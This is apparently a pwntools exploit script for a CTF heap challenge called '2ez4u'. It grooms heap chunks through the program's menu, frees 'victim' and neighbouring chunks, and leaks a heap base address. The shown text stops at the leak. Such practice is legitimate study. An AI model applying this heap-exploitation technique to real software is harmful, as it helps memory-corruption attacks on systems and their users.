#coding:utf-8
from __future__ import print_function
from pwn import *
from ctypes import c_uint32

context.arch = 'x86-64'
context.os = 'linux'
context.log_level = 'DEBUG'

io = process("./2ez4u", env = {"LD_PRELOAD" : "./libc.so"})

base_addr = 0x0000555555554000

def add(l, desc):
    io.recvuntil('your choice:')
    io.sendline('1')
    io.recvuntil('color?(0:red, 1:green):')
    io.sendline('0')
    io.recvuntil('value?(0-999):')
    io.sendline('0')
    io.recvuntil('num?(0-16)')
    io.sendline('0')
    io.recvuntil('description length?(1-1024):')
    io.sendline(str(l))
    io.recvuntil('description of the apple:')
    io.sendline(desc)

def dele(idx):
    io.recvuntil('your choice:')
    io.sendline('2')
    io.recvuntil('which?(0-15):')
    io.sendline(str(idx))

def edit(idx, desc):
    io.recvuntil('your choice:')
    io.sendline('3')
    io.recvuntil('which?(0-15):')
    io.sendline(str(idx))
    io.recvuntil('color?(0:red, 1:green):')
    io.sendline('2')
    io.recvuntil('value?(0-999):')
    io.sendline('1000')
    io.recvuntil('num?(0-16)')
    io.sendline('17')
    io.recvuntil('new description of the apple:')
    io.sendline(desc)

def show(idx):
    io.recvuntil('your choice:')
    io.sendline('4')
    io.recvuntil('which?(0-15):')
    io.sendline(str(idx))

add(0x60,  '0'*0x60 ) # 
add(0x60,  '1'*0x60 ) #
add(0x60,  '2'*0x60 ) #
add(0x60,  '3'*0x60 ) #
add(0x60,  '4'*0x60 ) #
add(0x60,  '5'*0x60 ) #
add(0x60,  '6'*0x60 ) #

add(0x3f0, '7'*0x3f0) # playground
add(0x30,  '8'*0x30 )
add(0x3e0, '9'*0x3d0) # sup
add(0x30,  'a'*0x30 )
add(0x3f0, 'b'*0x3e0) # victim
add(0x30,  'c'*0x30 )

dele(0x9)
dele(0xb)
dele(0x0)
gdb.attach(io, 'b *0x%x' % (base_addr+0x124e))
add(0x400, '0'*0x400)
# leak
show(0xb)
io.recvuntil('num: ')
print(hex(c_uint32(int(io.recvline()[:-1])).value))

io.recvuntil('description:')
HEAP = u64(io.recvline()[:-1]+'\x00\x00')-0x7e0
log.info("heap base 0x%016x" % HEAP)
